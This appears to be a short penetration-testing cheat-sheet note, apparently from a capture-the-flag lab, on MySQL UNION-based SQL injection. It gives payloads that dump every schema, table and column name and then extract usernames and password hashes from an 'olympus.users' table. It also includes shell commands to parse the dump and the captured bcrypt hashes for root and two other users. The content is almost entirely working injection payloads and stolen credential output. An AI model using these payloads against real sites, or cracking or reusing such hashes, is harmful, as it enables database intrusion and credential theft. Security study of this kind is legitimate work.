Dumps all tables, columns, and databases :DDDDDDDDDDD
search=GUNe' UNION SELECT NULL,NULL,NULL,json_arrayagg(concat_ws(0x3a,table_name,column_name,table_schema)),NULL,NULL,NULL,NULL,NULL,NULL from INFORMATION_SCHEMA.columns#&submit=

Parsing dump:
Inspect, Copy all from here, and save it to file called dump 

Parse all dump to cleaner format:
cat dump | tr ',' '\n' > formatted_dump.txt

Hunt for where credentials are stored:
 cat formatted_dump.txt | grep -i pass  

search=' UNION ALL SELECT NULL,NULL,NULL,json_arrayagg(concat_ws(0x3a,user_name,user_password)),NULL,NULL,NULL,NULL,NULL,NULL from olympus.users#&submit=

' UNION ALL SELECT NULL,NULL,NULL,json_arrayagg(concat_ws(0x3a,user_name,user_password)),NULL,NULL,NULL,NULL,NULL,NULL from olympus.users#
["prometheus:$2y$10$YC6uoMwK9VpB5QL513vfLu1RV2sgBf01c0lzPHcz1qK2EArDvnj3C", "root:$2y$10$lcs4XWc5yjVNsMb4CUBGJevEkIuWdZN3rsuKWHCc.FGtapBAfW.mK", "zeus:$2y$10$cpJKDXh2wlAI5KlCsUaLCOnf0g5fiG0QSUS53zp/r0HMtaj6rT4lC"]![unnamed_0379baf0853e420a94a2db1ce03dd22d](docs/Attachments/Methodology/1.%20Enumeration/0.%20Initial%20Recon/4.%20Common%20Web%20Attack%20Techniques/SQLI/MySQL/SQLI%20cheat%20sheet/parsing%20dump/{{notename}}-202605011506.png)
![unnamed_c56ae771861442bb929bce19f6ae747e](docs/Attachments/Methodology/1.%20Enumeration/0.%20Initial%20Recon/4.%20Common%20Web%20Attack%20Techniques/SQLI/MySQL/SQLI%20cheat%20sheet/parsing%20dump/{{notename}}-202605011506-1.png)
![unnamed_e0ae11eae75346958d0ecb590adc8132](docs/Attachments/Methodology/1.%20Enumeration/0.%20Initial%20Recon/4.%20Common%20Web%20Attack%20Techniques/SQLI/MySQL/SQLI%20cheat%20sheet/parsing%20dump/{{notename}}-202605011506-2.png)
![unnamed_53228f66c14c41ef91d5ad0896a701cc](docs/Attachments/Methodology/1.%20Enumeration/0.%20Initial%20Recon/4.%20Common%20Web%20Attack%20Techniques/SQLI/MySQL/SQLI%20cheat%20sheet/parsing%20dump/{{notename}}-202605011507.png)